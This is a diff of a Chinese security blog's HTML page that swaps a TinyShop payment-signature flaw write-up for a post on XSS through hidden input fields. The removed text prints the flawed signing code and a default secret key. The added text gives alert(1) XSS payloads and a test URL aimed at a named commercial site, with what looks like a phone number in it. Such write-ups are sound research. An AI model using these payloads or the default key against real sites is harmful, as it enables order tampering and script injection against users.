@@ -4,40 +4,30 @@
 <head>
   <meta charset="UTF-8">
   
-    <title>tinyshop商城系统支付漏洞 | xd_xd&#39;s blog</title>
+    <title>input标签type为hidden时的xss利用 | xd_xd&#39;s blog</title>
     <meta name="viewport" content="width=device-width, initial-scale=1,user-scalable=no">
     
     <meta name="author" content="xd_xd">
     
 
     
-    <meta name="description" content="tinyshop商城使用余额支付的时候，签名机制存在问题。导致签名失效。可以篡改订单金额，从而实现一分钱支付任意金额的订单。
-测试版本tinyshop最新版1.6
-sign字段的签名算法如下：
-public function buildSign($sort_para,$key,$sign_type = &quot;MD5&quot;)
-{
-    //把数组所有元素，按照“参数=参数值”的模式用“&amp;amp;”字符拼接">
+    <meta name="description" content="问题场景有时候会遇到这个场景的XSS，输出在input标签的value里，可以引入双引号，所以可以引入新的属性。但是type是hidden。导致常规的一些事件没法利用。
+&amp;lt;input type=&quot;hidden&quot; name=&quot;redacted&quot; value=&quot;default&quot; injection=&quot;xss&quot; /&amp;gt;
+结论在某些条件下是可以执行javascript的，但是比较鸡肋。资料收集的">
 <meta property="og:type" content="article">
-<meta property="og:title" content="tinyshop商城系统支付漏洞">
-<meta property="og:url" content="http://xdxd.love/2015/08/11/tinyshop商城系统支付漏洞/index.html">
+<meta property="og:title" content="input标签type为hidden时的xss利用">
+<meta property="og:url" content="http://xdxd.love/2016/01/20/input标签type为hidden时的xss利用/index.html">
 <meta property="og:site_name" content="xd_xd's blog">
-<meta property="og:description" content="tinyshop商城使用余额支付的时候，签名机制存在问题。导致签名失效。可以篡改订单金额，从而实现一分钱支付任意金额的订单。
-测试版本tinyshop最新版1.6
-sign字段的签名算法如下：
-public function buildSign($sort_para,$key,$sign_type = &quot;MD5&quot;)
-{
-    //把数组所有元素，按照“参数=参数值”的模式用“&amp;amp;”字符拼接">
-<meta property="og:image" content="http://xdxd.love/images/tinyshop1.png">
-<meta property="og:image" content="http://xdxd.love/images/tinyshop2.png">
-<meta property="og:updated_time" content="2015-12-02T09:01:57.000Z">
+<meta property="og:description" content="问题场景有时候会遇到这个场景的XSS，输出在input标签的value里，可以引入双引号，所以可以引入新的属性。但是type是hidden。导致常规的一些事件没法利用。
+&amp;lt;input type=&quot;hidden&quot; name=&quot;redacted&quot; value=&quot;default&quot; injection=&quot;xss&quot; /&amp;gt;
+结论在某些条件下是可以执行javascript的，但是比较鸡肋。资料收集的">
+<meta property="og:image" content="http://xdxd.love/images/inputhidden1.png">
+<meta property="og:updated_time" content="2016-01-20T06:37:13.000Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="tinyshop商城系统支付漏洞">
-<meta name="twitter:description" content="tinyshop商城使用余额支付的时候，签名机制存在问题。导致签名失效。可以篡改订单金额，从而实现一分钱支付任意金额的订单。
-测试版本tinyshop最新版1.6
-sign字段的签名算法如下：
-public function buildSign($sort_para,$key,$sign_type = &quot;MD5&quot;)
-{
-    //把数组所有元素，按照“参数=参数值”的模式用“&amp;amp;”字符拼接">
+<meta name="twitter:title" content="input标签type为hidden时的xss利用">
+<meta name="twitter:description" content="问题场景有时候会遇到这个场景的XSS，输出在input标签的value里，可以引入双引号，所以可以引入新的属性。但是type是hidden。导致常规的一些事件没法利用。
+&amp;lt;input type=&quot;hidden&quot; name=&quot;redacted&quot; value=&quot;default&quot; injection=&quot;xss&quot; /&amp;gt;
+结论在某些条件下是可以执行javascript的，但是比较鸡肋。资料收集的">
 
     
     <link rel="alternative" href="/atom.xml" title="xd_xd&#39;s blog" type="application/atom+xml">
@@ -97,14 +87,14 @@ public function buildSign($sort_para,$key,$sign_type = &quot;MD5&quot;)
 		<header class="article-info clearfix">
   <h1 itemprop="name">
     
-      <a href="/2015/08/11/tinyshop商城系统支付漏洞/" title="tinyshop商城系统支付漏洞" itemprop="url">tinyshop商城系统支付漏洞</a>
+      <a href="/2016/01/20/input标签type为hidden时的xss利用/" title="input标签type为hidden时的xss利用" itemprop="url">input标签type为hidden时的xss利用</a>
   </h1>
   <p class="article-author">By
        
 		<a href="/about" title="xd_xd" target="_blank" itemprop="author">xd_xd</a>
 		
   <p class="article-time">
-    <time datetime="2015-08-11T07:58:03.000Z" itemprop="datePublished"> 发表于 Aug 11 2015</time>
+    <time datetime="2016-01-20T06:05:01.000Z" itemprop="datePublished"> 发表于 Jan 20 2016</time>
     
   </p>
 </header>
@@ -113,24 +103,25 @@ public function buildSign($sort_para,$key,$sign_type = &quot;MD5&quot;)
 		<div id="toc" class="toc-article">
 			<strong class="toc-title">文章目录</strong>
 		
-			
+			<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#问题场景"><span class="toc-number">1.</span> <span class="toc-text">问题场景</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#结论"><span class="toc-number">2.</span> <span class="toc-text">结论</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#利用方式"><span class="toc-number">3.</span> <span class="toc-text">利用方式</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#实例测试"><span class="toc-number">4.</span> <span class="toc-text">实例测试</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#参考资料"><span class="toc-number">5.</span> <span class="toc-text">参考资料</span></a></li></ol>
 		
 		</div>
 		
-		<p>tinyshop商城使用余额支付的时候，签名机制存在问题。导致签名失效。可以篡改订单金额，从而实现一分钱支付任意金额的订单。</p>
-<p>测试版本tinyshop最新版1.6</p>
-<p>sign字段的签名算法如下：</p>
-<pre><code>public <span class="keyword">function</span> buildSign(<span class="variable">$sort</span>_para,<span class="variable">$key</span>,<span class="variable">$sign</span>_type = <span class="string">"MD5"</span>)
-{
-    //把数组所有元素，按照“参数=参数值”的模式用“&amp;”字符拼接成字符串
-    <span class="variable">$prestr</span> = <span class="variable">$this-</span>&gt;createLinkstring(<span class="variable">$sort</span>_para);
-    //把拼接后的字符串再与安全校验码直接连接起来
-    <span class="variable">$prestr</span> = <span class="variable">$prestr</span>.<span class="variable">$key</span>;
-    <span class="variable">$mysgin</span> = <span class="variable">$prestr</span>;//md5(<span class="variable">$prestr</span>);
-    return <span class="variable">$mysgin</span>.<span class="string">'|||'</span>;
-}
-</code></pre><p>签名算法很正统，把参数拼接，再拼接安全校验码，然后md5.可是。。。可是。。。$mysgin = $prestr;//md5($prestr); 这里md5被注释掉了。经过测试发现，这个安全校验码是在安装的时候不会初始化。默认是NDHGFIUWYY943534578MNB，所以即使采用了md5做签名，也存在校验码泄露导致的签名机制失效。有了合法的sign就可以修改任意订单的金额了。</p>
-<p><img src="/images/tinyshop1.png" alt=""><br><img src="/images/tinyshop2.png" alt=""></p>
+		<h1 id="问题场景">问题场景</h1><p>有时候会遇到这个场景的XSS，输出在input标签的value里，可以引入双引号，所以可以引入新的属性。但是type是hidden。导致常规的一些事件没法利用。</p>
+<pre><code>&lt;input <span class="class"><span class="keyword">type</span></span>=<span class="string">"hidden"</span> name=<span class="string">"redacted"</span> value=<span class="string">"default"</span> injection=<span class="string">"xss"</span> /&gt;
+</code></pre><h1 id="结论">结论</h1><p>在某些条件下是可以执行javascript的，但是比较鸡肋。资料收集的结论就是利用价值极低。</p>
+<h1 id="利用方式">利用方式</h1><p>1，如果输出是在type=”hidden”之前，直接覆盖type，就变成了一个常规的xss。这个情况比较少见。</p>
+<p>2，建立两个HTML文件，one.htm</p>
+<pre><code><span class="tag">&lt;<span class="title">iframe</span> <span class="attribute">src</span>=<span class="value">two.htm</span>&gt;</span>
+</code></pre><p>two.htm</p>
+<pre><code>&lt;<span class="tag">input</span> type=hidden style=x:<span class="function"><span class="title">expression</span><span class="params">(alert(<span class="number">1</span>)</span></span>)&gt;
+</code></pre><p>测试于IE6-9 可以弹。</p>
+<p>3，firefox使用键盘交互的方式。</p>
+<pre><code>&lt;input <span class="class"><span class="keyword">type</span></span>=<span class="string">"hidden"</span> accesskey=<span class="string">"X"</span> onclick=<span class="string">"alert(1)"</span>&gt;
+</code></pre><p> Only works on Firefox. ALT+SHIFT+X on Windows/Linux, CTRL+ALT+X osx.</p>
+<h1 id="实例测试">实例测试</h1><pre><code><span class="keyword">http</span>://m.yohobuy.com/passport//back//backcode?phoneNum=15381187741&amp;token=a<span class="number">%20</span>accesskey=X<span class="number">%20</span>onclick=alert<span class="number">%281</span><span class="number">%29</span>&amp;areaCode=8
+</code></pre><p><img src="/images/inputhidden1.png" alt=""></p>
+<h1 id="参考资料">参考资料</h1><p><a href="http://zone.wooyun.org/content/9856" target="_blank" rel="external">http://zone.wooyun.org/content/9856</a></p>
   
 	</div>
 		<footer class="article-footer clearfix">
@@ -138,13 +129,13 @@ public function buildSign($sort_para,$key,$sign_type = &quot;MD5&quot;)
 
 <div class="article-categories">
   <span></span>
-  <a class="article-category-link" href="/categories/代码审计/">代码审计</a>
+  <a class="article-category-link" href="/categories/前端安全/">前端安全</a>
 </div>
 
 
   <div class="article-tags">
   
-  <span></span> <a href="/tags/支付漏洞/">支付漏洞</a>
+  <span></span> <a href="/tags/xss/">xss</a>
   </div>
 
 </div>
@@ -153,7 +144,7 @@ public function buildSign($sort_para,$key,$sign_type = &quot;MD5&quot;)
 
 	<div class="article-share" id="share">
 	
-	  <div data-url="http://xdxd.love/2015/08/11/tinyshop商城系统支付漏洞/" data-title="tinyshop商城系统支付漏洞 | xd_xd&#39;s blog" data-tsina="5256150165" class="share clearfix">
+	  <div data-url="http://xdxd.love/2016/01/20/input标签type为hidden时的xss利用/" data-title="input标签type为hidden时的xss利用 | xd_xd&#39;s blog" data-tsina="5256150165" class="share clearfix">
 	  </div>
 	
 	</div>
@@ -166,19 +157,11 @@ public function buildSign($sort_para,$key,$sign_type = &quot;MD5&quot;)
 	
 <nav class="article-nav clearfix">
  
- <div class="prev" >
- <a href="/2015/08/11/host-header-attack-之tinyshop重置密码漏洞/" title="host header attack 之tinyshop重置密码漏洞">
-  <strong>上一篇：</strong><br/>
-  <span>
-  host header attack 之tinyshop重置密码漏洞</span>
-</a>
-</div>
-
 
 <div class="next">
-<a href="/2015/08/06/hackrf-初探/"  title="hackrf 初探">
+<a href="/2016/01/18/ffmpeg-SSRF漏洞分析/"  title="ffmpeg SSRF漏洞分析">
  <strong>下一篇：</strong><br/> 
- <span>hackrf 初探
+ <span>ffmpeg SSRF漏洞分析
 </span>
 </a>
 </div>
@@ -187,7 +170,7 @@ public function buildSign($sort_para,$key,$sign_type = &quot;MD5&quot;)
 
 	
 <section id="comments" class="comment">
-	<div class="ds-thread" data-thread-key="2015/08/11/tinyshop商城系统支付漏洞/" data-title="tinyshop商城系统支付漏洞" data-url="http://xdxd.love/2015/08/11/tinyshop商城系统支付漏洞/"></div>
+	<div class="ds-thread" data-thread-key="2016/01/20/input标签type为hidden时的xss利用/" data-title="input标签type为hidden时的xss利用" data-url="http://xdxd.love/2016/01/20/input标签type为hidden时的xss利用/"></div>
 </section>
 
 
@@ -197,7 +180,7 @@ public function buildSign($sort_para,$key,$sign_type = &quot;MD5&quot;)
   <div id="toc" class="toc-aside">
   <strong class="toc-title">文章目录</strong>
  
- 
+ <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#问题场景"><span class="toc-number">1.</span> <span class="toc-text">问题场景</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#结论"><span class="toc-number">2.</span> <span class="toc-text">结论</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#利用方式"><span class="toc-number">3.</span> <span class="toc-text">利用方式</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#实例测试"><span class="toc-number">4.</span> <span class="toc-text">实例测试</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#参考资料"><span class="toc-number">5.</span> <span class="toc-text">参考资料</span></a></li></ol>
  
   </div>
 
